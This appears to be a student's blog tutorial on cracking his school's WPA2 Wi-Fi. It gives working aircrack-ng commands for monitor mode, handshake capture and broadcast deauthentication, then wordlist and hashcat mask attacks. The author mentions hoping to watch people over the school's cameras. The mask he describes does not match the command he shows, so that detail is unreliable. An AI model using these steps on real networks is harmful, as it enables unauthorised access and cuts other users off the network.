{
    "title": "Breaking WPA2",
    "description": "Hacking into my school's private network",
    "tags": ["Hacking", "Linux", "WPA"],
    "author": "Noah",
    "date": "11/08/2022",
    "showTitle": true,
    "indexed": true
}
### Disclaimer

> **Do not try anything you see done here!** *Don't do as I say **or** as I do.*
> 
> WPA2-PSK "cracking", "hacking", or whatever you wish to call this is unethical, and in many cases even **illegal**. Make sure you have permission before you mess with networks (which I had).

### *Why do you want access to the school's internet, anyways?*

1. This network has every nearly every administrative device connected to it. Do I want to mess with all of that? No. Is it fun to look around and count how many printers a school really needs? Yes.
2. For a kid studying cybersecurity, this is basically an end-goal. I'll be graduating in a year or two so I have to have as much fun as possible!
3. If I get lucky, the security camera system will be connected to the same network instead of being closed-circuit. Watching what people are doing over the school's camera system is almost as fun as watching Netflix during 4th period.

### So, how do we do all that?

Let me introduce you to the [aircrack-ng](https://www.aircrack-ng.org/) suite.

Aircrack is a collection of command-line tools (airmon, airodump, aireplay, and aircrack primarily) that is used to brute-force WPA/WPA2 encryption.

First, I use the command `airmon-ng check kill` to kill any processes that may be using the network card, since we'll be needing exclusive access to it. The service `avahi-daemon` is also using the network card and auto-restarts when killed, so I use `systemctl stop avahi-daemon` to prevent it from autostarting. Since I'm not disabling the service entirely, it will return when I restart my laptop, so no worries there. Of course, we're running these commands as root.


    root@kubuntu:~# systemctl stop avahi-daemon

    root@kubuntu:~# airmon-ng check kill

    Killing these processes:

    PID Name
    940 wpa_supplicant


With that being done, I can switch the network card (identified as `wlp1s0`) into **monitor mode**. This allows it to pick up (or "sniff") packets being sent to/from an access point. I can also specify a channel with the `-c` flag, but this isn't very important for what I'm doing.


    root@kubuntu:~# airmon-ng start wlp1s0

    PHY	Interface	Driver		Chipset
    phy0	wlp1s0		rtw_8822ce	00.0 Network controller: Realtek Semiconductor Co., Ltd. RTL8822CE 802.11ac PCIe Wireless Network Adapter
    (mac80211 monitor mode already enabled for [phy0]wlp1s0 on [phy0]10)


Now, we're ready to sniff some packets, I guess.

### Capturing a WPA handshake

To quickly test passwords for an access point (which is kind of important for brute-forcing), I can capture a **WPA handshake** which contains the answer to the one-way hash function that the password is compared with. This allows me to test millions of passwords very quickly by comparing them to the fake "password" hash found using the WPA handshake I captured.

But to do all of that, first I need to capture a WPA handshake as it occurs. This can be done using the `airodump-ng` and `aireplay-ng` commands from the aircrack-ng suite.

**airodump-ng** is the main tool responsible for selecting a target network and capturing the handshake I need. **aireplay-ng** is a tool used to send de-authentication attacks to the access point, which will come into play later.

    root@kubuntu:~# airodump-ng wlp1s0
    
Finally, here we have the **airodump CLI**.

    CH 14 ][ Elapsed: 0 s ][ 2022-11-07 14:31 

    BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

    88:51:FB:88:B9:92   -1        0        1    0   7   -1   WPA              Students_Wifi                  
    DA:55:A8:1B:37:FC  -30        2        0    0   1  360   WPA2             Admin_Wifi

*(These network names are fake, since I'm not just going to give out my school's name.)*

This shows all of the access points found in the area, and important information about them such as their **BSSID**, **ESSID**, **channel**, and **encryption** (WPA). Airodump will attempt to capture a WPA handshake, which occurs when a device connects to the access point. To narrow our search down to a specific access point, I will select a specific network by its BSSID and channel and only search for it.

    root@kubuntu:~# airodump-ng wlp1s0 --bssid 88:51:FB:88:B9:92 -c 7 -w OUTPUTFILE

The `-w OUTPUTFILE` argument tells airodump to write any captured WPA handshakes to a file named `OUTPUTFILE-01.cap`.
Now, we have this result.

    CH 7 ][ Elapsed: 0 s ][ 2022-11-07 14:31

    BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

    88:51:FB:88:B9:92   -1        0        1    0   7   -1   WPA              Students_Wifi

Instead of having multiple networks shown, we have filtered the scan down to a single address. This increases our chances of capturing a WPA handshake for this specific network.

By default, the WPA handshake will appear in the top-right corner of the CLI once one is found. Here's an example (notice the handshake next to the timestamp in the top-right corner).

    CH 7 ][ Elapsed: 0 s ][ 2022-11-07 14:31 ] [ WPA handshake: 88:51:FB:88:B9:92

    BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

    88:51:FB:88:B9:92   -1        0        1    0   7   -1   WPA              Students_Wifi

**Wait.** What if we don't want to or don't have time to wait for a device to connect to the network and *maybe* capture a handshake? This is where `aireplay-ng` comes into play.

### Let's talk about deauth attacks

To speed up the process of capturing a WPA handshake, we can use a deauth (short for deauthentication) attack. This will trigger the access point into disconnecting multiple clients, who will *hopefully* automatically re-connect and give us a WPA handshake to capture. This is done using the `aireplay-ng` tool.

    root@kubuntu:~# aireplay-ng --deauth 0 -a 88:51:FB:88:B9:92 wlp1s0

This will send a `--deauth` attack to the `-a`ccess point at `88:51:FB:88:B9:92` on adapter `wlp1s0`, which looks like this:

    00:00:00 Waiting for beacon frame (BSSID: 88:51:FB:88:B9:92) on channel 7
    NB: this attack is more effective when targeting a connected wireless client (-c <client's mac>).
    00:00:00 Sending DeAuth to broadcast -- BSSID: [88:51:FB:88:B9:92]
    00:00:00 Sending DeAuth to broadcast -- BSSID: [88:51:FB:88:B9:92]
    00:00:00 Sending DeAuth to broadcast -- BSSID: [88:51:FB:88:B9:92]
    00:00:00 Sending DeAuth to broadcast -- BSSID: [88:51:FB:88:B9:92]
    00:00:00 Sending DeAuth to broadcast -- BSSID: [88:51:FB:88:B9:92]
    ...

This should be run at the same time as the original `airodump-ng` command to capture the handshake. If everything goes smoothly, we'll have a WPA handshake to test password lists against.

### Cracking the password

To test passwords against the `OUTPUTFILE-01.cap` file that `airodump-ng` generated, we use the tool `aircrack-ng`. For this, we'll need a password list (I'm using one from [SecLists](https://github.com/danielmiessler/SecLists)), and the `OUTPUTFILE-01.cap` file.

    root@kubuntu:~# aircrack-ng OUTPUTFILE-01.cap -w ./SecLists/Passwords/xato-net-10-million-passwords-1000000.txt

This starts `aircrack-ng` and with some luck, our password will be in the list we're testing.


    Aircrack-ng 1.7 

    [00:00:05] 44772/14344393 keys tested (9907.66 k/s) 

    Time left: 24 minutes, 3 seconds                           0.31%

    Current passphrase: 080385                     

    Master Key:     46 6D E0 EF 63 E8 6C E9 C2 CA B1 61 F8 80 9F 6A 
                    3A E4 AD 20 5A 61 12 D2 19 2D 7C F5 87 21 24 3A 

    Transient Key:  CF CC 76 B1 2C 84 A0 A5 8D 6C 41 F4 81 26 2C 4E 
                    FF 23 26 89 7D 7A 26 B8 3C A2 33 E5 06 15 7B 5C 
                    D9 49 71 FE 34 0F E7 AD 46 77 A2 9A 14 E7 F2 0C 
                    C7 36 A7 3B 45 EF D0 5E 7C 2E 07 11 FD 74 CB 3B 

    EAPOL HMAC:     E9 69 68 A2 14 B1 1B C8 53 6C 6B E5 F8 AD EE 30 

After some time, the correct password will be found!


    Aircrack-ng 1.7 

    [00:00:05] 44772/14344393 keys tested (9907.66 k/s) 

    Time left: 24 minutes, 3 seconds                           0.31%

    KEY FOUND! [ Students ]
    ...

*Haha, I'm kidding, it's not always that easy.*

### What if I still can't find the password?

If the password isn't in a wordlist somewhere, that means you're probably trying to crack a decent password. This was the case for the **Admin_Wifi** example network that was alongside the Students network above.

Let's talk about a tool called [Hashcat](https://hashcat.net/hashcat/). Hashcat is a hash-cracking program that can be used, in our case, to brute-force WPA2.

Hashcat is needed for two very important reasons:
1. Instead of using a pre-defined wordlist, Hashcat can create a password guess from any number of random parameters. In this case, we can use `?l` to represent lowercase ASCII characters, `?u` for uppercase ones, and `?d` for decimal values (numbers). By doing this, we can create guessing rules (Example: `?l?u?d` means the password is a lowercase character, followed by an uppercase character, followed by a single number).
2. Hashcat can run on the GPU (using Nvidia CUDA in this case) to greatly speed up the process by using execution parallelization techniques (also known as "running 5,000 password guessing algorithms at the same time").

> I brought the **`OUTPUTFILE-01.cap`** capture home with me on a USB drive!

I converted the WPA handshake that I captured earlier into an `hc22000` file, which Hashcat accepts. Then, I used the mask `?1?1?1?1201?d` where `?1` was a set of all 7-bit ASCII characters. This mask means that the first four characters could be anything, and the last four characters would likely be a year between 2010 and 2019.

The `-m 22000` argument specifies what type of file we are cracking ("22000" for a `WPA-PBKDF2-PMKID+EAPOL` file), and the `-a 3` tells Hashcat to attempt a brute-force attack.

Here's the command:

    hashcat -m 22000 WPA.hc22000 -1 ?d?l?u -a 3 ?1?1?1?1?1?1?1?1

And, after running for around 3 minutes, I got the result I was looking for.

    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
    Hash.Target......: WPA.hc22000

Finally, the network's SSID and credentials could be found in the `hashcat.potfile` file generated by Hashcat.

> I loved this challenge, and it was a good opportunity for me to learn about tools that people can use to brute-force encryption. It was also a good lesson in some of the ways that networks handle authentication, and I greatly enjoyed the experience.

## References
 - [https://hashcat.net/wiki/doku.php](https://hashcat.net/wiki/doku.php?id=mask_attack)
 - [https://www.aircrack-ng.org/](https://www.aircrack-ng.org/)
 - [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)